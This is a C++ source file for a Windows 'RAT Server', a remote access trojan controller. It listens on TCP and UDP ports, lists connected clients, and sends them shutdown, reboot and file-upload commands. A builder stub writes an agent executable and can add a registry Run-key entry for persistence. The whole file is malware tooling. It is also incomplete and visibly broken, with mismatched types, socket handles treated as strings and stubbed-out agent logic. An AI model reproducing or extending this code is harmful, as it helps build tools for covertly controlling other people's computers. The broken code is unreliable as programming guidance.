#include <iostream>
#include <thread>
#include <vector>
#include <map>
#include <mutex>
#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <string>
#include <fstream>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Comctl32.lib")

#define TCP_PORT 9999
#define UDP_PORT 8888
#define BUILDER_FILE "agent_builder.exe"

std::map<std::string, std::string> clients;
std::mutex clientsMutex;
SOCKET tcpServerSocket = INVALID_SOCKET;
SOCKET udpServerSocket = INVALID_SOCKET;
HWND clientList, statusLabel, terminalOutput;
WSADATA wsaData;

void logMessage(const std::string& message, COLORREF color) {
    int len = GetWindowTextLength(terminalOutput);
    SendMessage(terminalOutput, EM_SETSEL, len, len);
    CHARFORMAT cf;
    cf.cbSize = sizeof(CHARFORMAT);
    cf.dwMask = CFM_COLOR;
    cf.crTextColor = color;
    SendMessage(terminalOutput, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);
    SendMessage(terminalOutput, EM_REPLACESEL, 0, (LPARAM)message.c_str());
    SendMessage(terminalOutput, EM_SETSEL, len, len);
    SendMessage(terminalOutput, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf);
    SendMessage(terminalOutput, EM_REPLACESEL, 0, (LPARAM)"\n");
}

void updateClientList() {
    SendMessage(clientList, LB_RESETCONTENT, 0, 0);
    std::lock_guard<std::mutex> lock(clientsMutex);
    for (auto& client : clients) {
        SendMessage(clientList, LB_ADDSTRING, 0, (LPARAM)client.second.c_str());
    }
}

void handleTCPClient(SOCKET clientSocket) {
    char recvBuf[1024];
    while (true) {
        int bytesReceived = recv(clientSocket, recvBuf, sizeof(recvBuf), 0);
        if (bytesReceived <= 0) {
            logMessage("TCP client disconnected.", RGB(255, 0, 0));
            std::lock_guard<std::mutex> lock(clientsMutex);
            for (auto it = clients.begin(); it != clients.end(); ++it) {
                if (it->second == clientSocket) {
                    clients.erase(it);
                    break;
                }
            }
            updateClientList();
            closesocket(clientSocket);
            break;
        }
        recvBuf[bytesReceived] = '\0';
        std::string command(recvBuf);
        // Handle TCP command
    }
}

void handleUDPClient(SOCKET clientSocket) {
    char recvBuf[1024];
    while (true) {
        int bytesReceived = recvfrom(clientSocket, recvBuf, sizeof(recvBuf), 0, NULL, NULL);
        if (bytesReceived <= 0) {
            logMessage("UDP client disconnected.", RGB(255, 0, 0));
            closesocket(clientSocket);
            break;
        }
        recvBuf[bytesReceived] = '\0';
        std::string command(recvBuf);
        // Handle UDP command
    }
}

void startTCPServer() {
    tcpServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (tcpServerSocket == INVALID_SOCKET) {
        logMessage("Error creating TCP socket.", RGB(255, 0, 0));
        return;
    }

    SOCKADDR_IN serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(TCP_PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(tcpServerSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        logMessage("Bind failed.", RGB(255, 0, 0));
        closesocket(tcpServerSocket);
        return;
    }

    if (listen(tcpServerSocket, SOMAXCONN) == SOCKET_ERROR) {
        logMessage("TCP Listen failed.", RGB(255, 0, 0));
        closesocket(tcpServerSocket);
        return;
    }

    logMessage("TCP Server started, listening on port " + std::to_string(TCP_PORT), RGB(0, 255, 0));

    while (true) {
        SOCKET clientSocket = accept(tcpServerSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            logMessage("TCP Accept failed.", RGB(255, 0, 0));
            continue;
        }
        std::lock_guard<std::mutex> lock(clientsMutex);
        char clientIp[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientSocket, clientIp, INET_ADDRSTRLEN);
        std::string clientInfo = std::string(clientIp) + ":" + std::to_string(htonl(TCP_PORT));
        clients[clientInfo] = clientSocket;
        updateClientList();
        std::thread(handleTCPClient, clientSocket).detach();
    }
}

void startUDPServer() {
    udpServerSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpServerSocket == INVALID_SOCKET) {
        logMessage("Error creating UDP socket.", RGB(255, 0, 0));
        return;
    }

    SOCKADDR_IN serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(UDP_PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(udpServerSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        logMessage("Bind failed.", RGB(255, 0, 0));
        closesocket(udpServerSocket);
        return;
    }

    logMessage("UDP Server started, listening on port " + std::to_string(UDP_PORT), RGB(0, 255, 0));

    while (true) {
        char recvBuf[1024];
        SOCKADDR_IN clientAddr;
        int clientAddrSize = sizeof(clientAddr);
        int bytesReceived = recvfrom(udpServerSocket, recvBuf, sizeof(recvBuf), 0, (SOCKADDR*)&clientAddr, &clientAddrSize);
        if (bytesReceived == SOCKET_ERROR) {
            logMessage("UDP Receive failed.", RGB(255, 0, 0));
            continue;
        }
        recvBuf[bytesReceived] = '\0';
        std::string clientIP = inet_ntoa(clientAddr.sin_addr);
        std::string clientInfo = clientIP + ":" + std::to_string(UDP_PORT);
        logMessage("UDP data received from client " + clientInfo + ": " + recvBuf, RGB(0, 255, 0));
        // Handle UDP command
    }
}

void buildAgent(const std::string& ip, int port, const std::string& password, bool startOnStartup) {
    // Build agent executable with specified parameters
    std::ofstream agentFile(BUILDER_FILE, std::ios::binary);
    if (!agentFile.is_open()) {
        std::cerr << "Error: Failed to create agent file." << std::endl;
        return;
    }

    // Write agent code here...
    // Example:
    agentFile.write("Agent code with IP: " + ip + ", Port: " + std::to_string(port) + ", Password: " + password, 100);

    agentFile.close();

    // Add startup entry if required
    if (startOnStartup) {
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            char path[MAX_PATH];
            GetModuleFileName(NULL, path, MAX_PATH);
            std::string command = "\"" + std::string(path) + "\"";
            RegSetValueEx(hKey, "RATServer", 0, REG_SZ, (BYTE*)command.c_str(), command.size());
            RegCloseKey(hKey);
        }
    }

    std::cout << "Agent built successfully." << std::endl;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE: {
            CreateWindowW(L"Static", L"Status: Server not started", WS_VISIBLE | WS_CHILD, 10, 10, 200, 30, hwnd, NULL, NULL, NULL);
            clientList = CreateWindowW(L"ListBox", NULL, WS_VISIBLE | WS_CHILD | WS_VSCROLL | LBS_NOTIFY, 10, 50, 200, 200, hwnd, NULL, NULL, NULL);
            terminalOutput = CreateWindowW(L"Edit", NULL, WS_VISIBLE | WS_CHILD | ES_MULTILINE | ES_READONLY | WS_VSCROLL, 220, 10, 500, 240, hwnd, NULL, NULL, NULL);
            break;
        }
        case WM_CONTEXTMENU: {
            if (HWND(wParam) == clientList) {
                int index = SendMessage(clientList, LB_ITEMFROMPOINT, 0, lParam);
                if (index >= 0) {
                    POINT pt;
                    GetCursorPos(&pt);
                    HMENU hPopupMenu = CreatePopupMenu();
                    AppendMenu(hPopupMenu, MF_STRING, 1, "Shutdown");
                    AppendMenu(hPopupMenu, MF_STRING, 2, "Reboot");
                    AppendMenu(hPopupMenu, MF_STRING, 3, "Upload File");
                    TrackPopupMenu(hPopupMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL);
                }
            }
            break;
        }
        case WM_COMMAND: {
            if (LOWORD(wParam) == 1) {
                // Shutdown client
                int index = SendMessage(clientList, LB_GETCURSEL, 0, 0);
                if (index != LB_ERR) {
                    char clientIP[256];
                    SendMessage(clientList, LB_GETTEXT, index, (LPARAM)clientIP);
                    SOCKET clientSocket = clients[clientIP];
                    send(clientSocket, "shutdown", strlen("shutdown"), 0);
                }
            } else if (LOWORD(wParam) == 2) {
                // Reboot client
                int index = SendMessage(clientList, LB_GETCURSEL, 0, 0);
                if (index != LB_ERR) {
                    char clientIP[256];
                    SendMessage(clientList, LB_GETTEXT, index, (LPARAM)clientIP);
                    SOCKET clientSocket = clients[clientIP];
                    send(clientSocket, "reboot", strlen("reboot"), 0);
                }
            } else if (LOWORD(wParam) == 3) {
                // Upload file to client
                int index = SendMessage(clientList, LB_GETCURSEL, 0, 0);
                if (index != LB_ERR) {
                    char clientIP[256];
                    SendMessage(clientList, LB_GETTEXT, index, (LPARAM)clientIP);
                    SOCKET clientSocket = clients[clientIP];
                    // Implement file upload logic
                }
            }
            break;
        }
        case WM_DESTROY: {
            closesocket(tcpServerSocket);
            closesocket(udpServerSocket);
            WSACleanup();
            PostQuitMessage(0);
            break;
        }
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

int main() {
    WNDCLASSW wc = {};
    wc.hbrBackground = CreateSolidBrush(RGB(50, 50, 50));
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hInstance = NULL;
    wc.lpszClassName = L"RATServer";
    wc.lpfnWndProc = WndProc;
    RegisterClassW(&wc);

    HWND hwnd = CreateWindowW(L"RATServer", L"RAT Server", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 800, 300, NULL, NULL, NULL, NULL);

    if (hwnd == NULL) {
        MessageBox(NULL, L"Window Creation Failed!", L"Error!", MB_ICONEXCLAMATION | MB_OK);
        return 0;
    }

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    std::thread tcpThread(startTCPServer);
    std::thread udpThread(startUDPServer);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    tcpThread.join();
    udpThread.join();

    return msg.wParam;
}
